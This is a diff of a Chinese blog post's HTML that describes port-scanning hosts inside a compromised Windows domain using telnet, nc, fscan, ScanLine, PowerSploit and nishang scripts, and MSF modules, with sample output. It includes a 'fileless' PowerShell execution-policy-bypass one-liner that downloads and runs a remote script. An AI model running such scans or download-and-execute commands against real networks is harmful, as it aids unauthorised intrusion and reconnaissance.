@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -469,53 +472,61 @@
 </blockquote>
 <p>在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。</p>
 <h2 id="1、Telnet"><a href="#1、Telnet" class="headerlink" title="1、Telnet"></a>1、Telnet</h2><p>如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。</p>
-<pre><code>C:\Users\daniel10&gt;telnet dc 80
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;telnet dc 80
 正在连接dc...无法打开到主机的连接。 在端口 80: 连接失败
 
 C:\Users\daniel10&gt;telnet 192.168.7.7 443
-正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败</code></pre>
+正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="2、nc"><a href="#2、nc" class="headerlink" title="2、nc"></a>2、nc</h2><p>素有瑞士军刀之称的 nc 也是可以拿来做端口探测的。</p>
 <p>nc 下载地址：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
-<pre><code>nc.exe -vv 192.168.7.7 3389</code></pre>
-<pre><code>C:\Users\daniel10&gt;nc.exe -vv 192.168.7.7 3389
-DNS fwd/rev mismatch: DC != DC.teamssix.com
-DC [192.168.7.7] 3389 (ms-wbt-server) open</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">nc.exe -vv 192.168.7.7 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;nc.exe -vv 192.168.7.7 3389
+DNS fwd&#x2F;rev mismatch: DC !&#x3D; DC.teamssix.com
+DC [192.168.7.7] 3389 (ms-wbt-server) open<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>拿来进行多个端口扫描也是可以的，就是扫描速度有点慢</p>
-<pre><code>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535
+<pre class="line-numbers language-none"><code class="language-none">nc.exe -rz -w 2 -vv 192.168.7.7 0-65535
 
 -r 随机指定本地与远端主机的通信端口
--z 使用0输入/输出模式，只在扫描通信端口时使用
--w&lt;超时秒数&gt; 设置等待连线的时间</code></pre>
-<pre><code>C:\Users\daniel10&gt;nc.exe -rz -w 2 -vv 192.168.7.7 443-445
-DNS fwd/rev mismatch: DC != DC.teamssix.com
+-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用
+-w&lt;超时秒数&gt; 设置等待连线的时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;nc.exe -rz -w 2 -vv 192.168.7.7 443-445
+DNS fwd&#x2F;rev mismatch: DC !&#x3D; DC.teamssix.com
 DC [192.168.7.7] 444 (?): TIMEDOUT
 DC [192.168.7.7] 443 (https): TIMEDOUT
 DC [192.168.7.7] 445 (microsoft-ds) open
-sent 0, rcvd 0</code></pre>
+sent 0, rcvd 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="3、fscan"><a href="#3、fscan" class="headerlink" title="3、fscan"></a>3、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，项目地址：<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
-<pre><code>fscan.exe -h 192.168.7.7 -p 22,445</code></pre>
-<pre><code>C:\Users\daniel10&gt;fscan.exe -h 192.168.7.7 -p 22,445
+<pre class="line-numbers language-none"><code class="language-none">fscan.exe -h 192.168.7.7 -p 22,445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;fscan.exe -h 192.168.7.7 -p 22,445
 
    ___                              _
-  / _ \     ___  ___ _ __ __ _  ___| | __
- / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
-/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
-\____/     |___/\___|_|  \__,_|\___|_|\_\
+  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __
+ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;
+&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\
                      fscan version: 1.5.1
 scan start
 (icmp) Target &#39;192.168.7.7&#39; is alive
 icmp alive hosts len is: 1
 192.168.7.7:445 open
 [+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)
-scan end</code></pre>
+scan end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="4、ScanLine"><a href="#4、ScanLine" class="headerlink" title="4、ScanLine"></a>4、ScanLine</h2><p>McAfee 出品的一款经典的端口扫描工具，ScanLine 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p>
 <p>但是项目地址的下载按钮貌似失效了，其他的下载地址：<a target="_blank" rel="noopener" href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p>
-<pre><code>scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7</code></pre>
-<pre><code>C:\Users\daniel10&gt;scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7
+<pre class="line-numbers language-none"><code class="language-none">scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7
 
 ScanLine (TM) 1.01
 Copyright (c) Foundstone, Inc. 2002
-http://www.foundstone.com
+http:&#x2F;&#x2F;www.foundstone.com
 Scan of 1 IP started at Wed Feb 24 21:31:11 2021
 -------------------------------------------------------------------------------
 192.168.7.7
@@ -523,27 +534,32 @@ Responds with ICMP unreachable: No
 TCP ports: 445 3389
 -------------------------------------------------------------------------------
 Scan finished at Wed Feb 24 21:31:15 2021
-1 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs</code></pre>
+1 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="5、S-扫描器"><a href="#5、S-扫描器" class="headerlink" title="5、S 扫描器"></a>5、S 扫描器</h2><p>S 扫描器支持大网段扫描，扫描速度也很快，是比较早期的一款扫描工具了，比较适合运行在 Windows Server 2003 以下版本的操作系统中，下载地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1gdGM4F5">https://pan.baidu.com/s/1gdGM4F5</a></p>
 <blockquote>
 <p>值得提一句的是在我下载该工具到本地后，火绒立马给它删了，而其他的扫描工具火绒都没告警。</p>
 </blockquote>
-<pre><code>s.exe tcp 192.168.7.7 22,80,443,445 7</code></pre>
-<pre><code>C:\Users\daniel10&gt;s.exe tcp 192.168.7.7 22,80,443,445 7
+<pre class="line-numbers language-none"><code class="language-none">s.exe tcp 192.168.7.7 22,80,443,445 7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;s.exe tcp 192.168.7.7 22,80,443,445 7
 TCP Port Scanner V1.1 By WinEggDrop
 
 Normal Scan: About To Scan 4 Ports Using 7 Thread
 192.168.7.7      445   Open
-Scan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports</code></pre>
+Scan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="6、PowerShell-脚本"><a href="#6、PowerShell-脚本" class="headerlink" title="6、PowerShell 脚本"></a>6、PowerShell 脚本</h2><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit 的 Invoke-Portscan 脚本下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1</a></p>
 <p>无文件形式（推荐）</p>
-<pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <blockquote>
 <p>如果报错，估计是网络的问题</p>
 </blockquote>
 <p>有文件形式</p>
-<pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre>
-<pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Ho
+<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -Command &quot;Import-Module .&#x2F;Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module .&#x2F;Invoke-Portscan.ps1;Invoke-Portscan -Ho
 sts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;
 
 Hostname      : 192.168.7.7
@@ -551,22 +567,26 @@ alive         : True
 openPorts     : &#123;445, 3389&#125;
 closedPorts   : &#123;8080, 80, 1433&#125;
 filteredPorts : &#123;&#125;
-finishTime    : 2021/2/24 下午 21:14:06</code></pre>
+finishTime    : 2021&#x2F;2&#x2F;24 下午 21:14:06<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang 的 Invoke-Portscan 脚本下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1</a></p>
-<pre><code> Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445</code></pre>
-<pre><code>PS C:\Users\daniel10&gt; Import-Module .\Invoke-Portscan.ps1
+<pre class="line-numbers language-none"><code class="language-none">Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Import-Module .\Invoke-Portscan.ps1
 PS C:\Users\daniel10&gt; Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445
 
 IPAddress   HostName Ports
 ---------   -------- -----
-192.168.7.7          &#123;445&#125;</code></pre>
+192.168.7.7          &#123;445&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="7、MSF"><a href="#7、MSF" class="headerlink" title="7、MSF"></a>7、MSF</h2><p>万能的 MSF 自然也是能够进行端口探测的，MSF 中用于端口探测的模块有：</p>
-<pre><code>auxiliary/scanner/portscan/ack          TCP ACK端口扫描
-auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描
-auxiliary/scanner/portscan/syn             SYN端口扫描
-auxiliary/scanner/portscan/tcp          TCP端口扫描  
-auxiliary/scanner/portscan/xmas         TCP XMas端口扫描
-……</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack          TCP ACK端口扫描
+auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ftpbounce    FTP bounce端口扫描
+auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn         	SYN端口扫描
+auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp          TCP端口扫描  
+auxiliary&#x2F;scanner&#x2F;portscan&#x2F;xmas         TCP XMas端口扫描
+……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>除了上述工具外，还有 nmap、masscan 什么的就不多说了，读者如果感兴趣可以自行尝试玩玩。</p>
 <blockquote>
 <p>参考文章：</p>
@@ -1000,7 +1020,7 @@ auxiliary/scanner/portscan/xmas         TCP XMas端口扫描
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
